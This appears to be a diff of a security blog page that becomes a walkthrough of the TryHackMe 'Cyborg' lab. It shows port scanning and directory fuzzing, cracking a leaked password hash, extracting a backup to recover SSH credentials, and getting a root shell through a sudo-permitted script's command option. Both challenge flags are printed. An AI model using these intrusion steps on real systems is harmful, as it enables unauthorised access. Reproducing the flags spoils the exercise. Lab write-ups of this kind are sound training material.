@@ -23,7 +23,7 @@
     
     
       
-        <title>Summary write ups (easy difficulty) - Offense, Defense, and Everything Between</title>
+        <title>Cyborg - Offense, Defense, and Everything Between</title>
       
     
     
@@ -71,6 +71,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#cyborg" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -102,7 +107,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Summary write ups (easy difficulty)
+              Cyborg
             
           </span>
         </div>
@@ -607,6 +612,127 @@
   
   
   
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#description" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Description
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Port Scanning
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vulnerability-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerability Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Foothold
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Foothold">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#password-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Password hash
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#archivetar-contents" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        archive.tar contents
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
   
 </nav>
                   </div>
@@ -621,29 +747,313 @@
                 
                   
 
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:brute-force" class="md-tag">brute-force</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:challenge" class="md-tag">challenge</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:easy" class="md-tag">easy</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:linux" class="md-tag">linux</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:offensive" class="md-tag">offensive</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:sudo-abuse" class="md-tag">sudo-abuse</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:tryhackme" class="md-tag">tryhackme</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:web" class="md-tag">web</a>
+      
+    
+  </nav>
 
 
-  <h1>Summary write ups (easy difficulty)</h1>
 
+<h1 id="cyborg">Cyborg</h1>
+<p><img alt="Cyborg logo" src="../logos/cyborg_logo.png" /></p>
+<p><strong>Platform:</strong> TryHackMe<br />
+<strong>Type:</strong> Challenge<br />
+<strong>Difficulty:</strong> Easy<br />
+<strong>Link:</strong> <a href="https://tryhackme.com/room/cyborgt8">Cyborg</a>  </p>
+<h2 id="description">Description</h2>
+<p>"A box involving encrypted archives, source code analysis and more."</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="port-scanning">Port Scanning</h3>
+<div class="highlight"><pre><span></span><code>ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//)
+nmap -p$ports -A -T4 TARGET_IP_ADDRESS
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>Host is up (0.031s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
+|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
+|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone|specialized
+Running (JUST GUESSING): Linux 5.X|6.X|4.X (96%), Google Android 10.X|11.X|12.X (93%), Adtran embedded (92%)
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/h:adtran:424rg
+Aggressive OS guesses: Linux 5.14 - 6.8 (96%), Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 - 5.15 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Adtran 424RG FTTH gateway (92%), Android 10 - 11 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Android 9 - 11 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 3 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div>
+<details class="success">
+<summary>Scan the machine, how many ports are open?</summary>
+<p>2</p>
+</details>
+<details class="success">
+<summary>What service is running on port 22?</summary>
+<p>ssh</p>
+</details>
+<details class="success">
+<summary>What service is running on port 80?</summary>
+<p>http</p>
+</details>
+<h3 id="http-enumeration">HTTP Enumeration</h3>
+<div class="highlight"><pre><span></span><code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
+gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
+</code></pre></div>
+<p><strong>Notes</strong>  </p>
 <ul>
-<li><a href="../brooklyn_nine_nine/">Brooklyn Nine Nine</a>  </li>
-<li><a href="../smag_grotto/">Smag Grotto</a>  </li>
-<li><a href="../bounty_hunter/">Bounty Hunter</a>  </li>
-<li><a href="../easy_peasy/">Easy Peasy</a></li>
-<li><a href="../gamingserver/">GamingServer</a></li>
-<li><a href="../rootme/">RootMe</a></li>
-<li><a href="../poster/">Poster</a></li>
-<li><a href="../brute_it/">Brute It</a></li>
-<li><a href="../startup/">Startup</a></li>
-<li><a href="../chill_hack/">Chill Hack</a></li>
-<li><a href="../cyborg/">Cyborg</a></li>
+<li>Default Apache installation page  </li>
+<li>No <code>robots.txt</code> or <code>sitemap</code> files  </li>
+<li>Nothing interesting in the source code  </li>
+<li><code>/admin</code> and <code>/etc</code> directories found during <code>ffuf</code> scan  </li>
+<li><code>/admin</code> directory reveals a chat transcript between site "admins". Information disclosure: "music_archive" - unsure what this is</li>
+<li>Source code for <code>/admin</code> reveals an <code>archive.tar</code> file available (downloaded and extracted for further analysis later)</li>
+<li><code>/etc</code> reveals two files with information disclosures within: "passwd" (contains password hash for "music_archive" user - copied to a file ("hash") for later analysis) and "squid.conf"</li>
 </ul>
+<h3 id="vulnerability-enumeration">Vulnerability Enumeration</h3>
+<div class="highlight"><pre><span></span><code>searchsploit OpenSSH 7.2p2  # Only result: username enumeration
+searchsploit httpd 2.4.18   # Only result: DoS
+</code></pre></div>
+<h2 id="foothold">Foothold</h2>
+<h3 id="password-hash">Password hash</h3>
+<div class="highlight"><pre><span></span><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt
+Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
+Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+squidward        (music_archive)     
+1g 0:00:00:00 DONE (2026-05-09 16:44) 10.00g/s 391680p/s 391680c/s 391680C/s jeremy21..lilica
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div>
+<h3 id="archivetar-contents"><code>archive.tar</code> contents</h3>
+<div class="highlight"><pre><span></span><code>tar -xvf archive.tar 
+home/field/dev/final_archive/
+home/field/dev/final_archive/hints.5
+home/field/dev/final_archive/integrity.5
+home/field/dev/final_archive/config
+home/field/dev/final_archive/README
+home/field/dev/final_archive/nonce
+home/field/dev/final_archive/index.5
+home/field/dev/final_archive/data/
+home/field/dev/final_archive/data/0/
+home/field/dev/final_archive/data/0/5
+home/field/dev/final_archive/data/0/3
+home/field/dev/final_archive/data/0/4
+home/field/dev/final_archive/data/0/1
+
+cat home/field/dev/final_archive/README
+This is a Borg Backup repository.
+See https://borgbackup.readthedocs.io/
+</code></pre></div>
+<p><a href="https://borgbackup.readthedocs.io/en/stable/quickstart.html#restoring-a-backup">Borg Backup Documentation - Restoring a Backup</a></p>
+<div class="highlight"><pre><span></span><code>borg extract home/field/dev/final_archive::music_archive
+Enter passphrase for key /home/kali/thm/home/field/dev/final_archive:   # Password from /etc directory password hash
+
+ls -al home      
+total 16
+drwxrwxr-x  4 kali kali 4096 May 10 14:49 .
+drwxrwxr-x  6 kali kali 4096 May  9 17:16 ..
+drwxr-xr-x 12 kali kali 4096 Dec 29  2020 alex
+drwxrwxr-x  3 kali kali 4096 May  9 17:03 field
+
+ls -al home/alex
+total 64
+drwxr-xr-x 12 kali kali 4096 Dec 29  2020 .
+drwxrwxr-x  4 kali kali 4096 May 10 14:49 ..
+-rw-------  1 kali kali  439 Dec 28  2020 .bash_history
+-rw-r--r--  1 kali kali  220 Dec 28  2020 .bash_logout
+-rw-r--r--  1 kali kali 3637 Dec 28  2020 .bashrc
+drwx------  4 kali kali 4096 Dec 28  2020 .config
+drwx------  3 kali kali 4096 Dec 28  2020 .dbus
+drwxrwxr-x  2 kali kali 4096 Dec 29  2020 Desktop
+drwxrwxr-x  2 kali kali 4096 Dec 29  2020 Documents
+drwxrwxr-x  2 kali kali 4096 Dec 28  2020 Downloads
+drwxrwxr-x  2 kali kali 4096 Dec 28  2020 Music
+drwxrwxr-x  2 kali kali 4096 Dec 28  2020 Pictures
+-rw-r--r--  1 kali kali  675 Dec 28  2020 .profile
+drwxrwxr-x  2 kali kali 4096 Dec 28  2020 Public
+drwxrwxr-x  2 kali kali 4096 Dec 28  2020 Templates
+drwxrwxr-x  2 kali kali 4096 Dec 28  2020 Videos
+
+ls -al home/alex/Documents 
+total 12
+drwxrwxr-x  2 kali kali 4096 Dec 29  2020 .
+drwxr-xr-x 12 kali kali 4096 Dec 29  2020 ..
+-rw-r--r--  1 kali kali  110 Dec 29  2020 note.txt
+
+cat home/alex/Documents/note.txt
+Wow I&#39;m awful at remembering Passwords so I&#39;ve taken my Friends advice and noting them down!
+
+alex:S3cretP@s3
+
+ssh alex@TARGET_IP_ADDRESS
+
+alex@ubuntu:~$ ls -al
+total 108
+drwx------ 17 alex alex 4096 Dec 31  2020 .
+drwxr-xr-x  3 root root 4096 Dec 30  2020 ..
+-rw-------  1 alex alex 1145 Dec 31  2020 .bash_history
+-rw-r--r--  1 alex alex  220 Dec 30  2020 .bash_logout
+-rw-r--r--  1 alex alex 3771 Dec 30  2020 .bashrc
+drwx------ 13 alex alex 4096 May 10 11:59 .cache
+drwx------  3 alex alex 4096 Dec 30  2020 .compiz
+drwx------ 15 alex alex 4096 Dec 30  2020 .config
+drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Desktop
+-rw-r--r--  1 alex alex   25 Dec 30  2020 .dmrc
+drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Documents
+drwxr-xr-x  2 alex alex 4096 Dec 31  2020 Downloads
+drwx------  2 alex alex 4096 Dec 30  2020 .gconf
+drwx------  3 alex alex 4096 Dec 31  2020 .gnupg
+-rw-------  1 alex alex 1590 Dec 31  2020 .ICEauthority
+drwx------  3 alex alex 4096 Dec 30  2020 .local
+drwx------  5 alex alex 4096 Dec 30  2020 .mozilla
+drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Music
+drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Pictures
+-rw-r--r--  1 alex alex  655 Dec 30  2020 .profile
+drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Public
+-rw-r--r--  1 alex alex    0 Dec 30  2020 .sudo_as_admin_successful
+drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Templates
+-r-xr--r--  1 alex alex   40 Dec 30  2020 user.txt
+drwxr-xr-x  2 alex alex 4096 Dec 30  2020 Videos
+-rw-------  1 alex alex   51 Dec 31  2020 .Xauthority
+-rw-------  1 alex alex   82 Dec 31  2020 .xsession-errors
+-rw-------  1 alex alex   82 Dec 31  2020 .xsession-errors.old
+alex@ubuntu:~$ cat user.txt
+</code></pre></div>
+<details class="success">
+<summary>What is the user.txt flag?</summary>
+<p>flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}</p>
+</details>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<div class="highlight"><pre><span></span><code>alex@ubuntu:~$ cat .bash_history
+&lt;REDACTED FOR BREVITY&gt;
+cd /etc/mp3backups/
+ls
+./backup.sh 
+ls
+echo &quot;hi&quot; &gt;&gt; backup.sh
+ls
+sudo ./backup.sh -c whoami
+sudo ./backup.sh -c /bin/bash
+&lt;REDACTED FOR BREVITY&gt;
+
+alex@ubuntu:~$ cd /etc/mp3backups/
+
+alex@ubuntu:/etc/mp3backups$ sudo ./backup.sh -c /bin/bash
+find: ‘/run/user/108/gvfs’: Permission denied
+/home/alex/Music/image12.mp3
+/home/alex/Music/image7.mp3
+/home/alex/Music/image1.mp3
+/home/alex/Music/image10.mp3
+/home/alex/Music/image5.mp3
+/home/alex/Music/image4.mp3
+/home/alex/Music/image3.mp3
+/home/alex/Music/image6.mp3
+/home/alex/Music/image8.mp3
+/home/alex/Music/image9.mp3
+/home/alex/Music/image11.mp3
+/home/alex/Music/image2.mp3
+Backing up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz
+
+tar: Removing leading `/&#39; from member names
+tar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
+tar: Exiting with failure status due to previous errors
+
+Backup finished
+
+root@ubuntu:/etc/mp3backups# cat /root/root.txt
+
+root@ubuntu:/etc/mp3backups# exit
+</code></pre></div>
+<details class="success">
+<summary>What is the root.txt flag?</summary>
+<p>flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}</p>
+</details>
+<p><strong>Tools Used</strong><br />
+<code>john</code> <code>borg</code></p>
+<p><strong>Date completed:</strong> 10/05/26<br />
+<strong>Date published:</strong> 10/05/26</p>
 
 
 
 
 
 
+
+  
+  
 
 
 
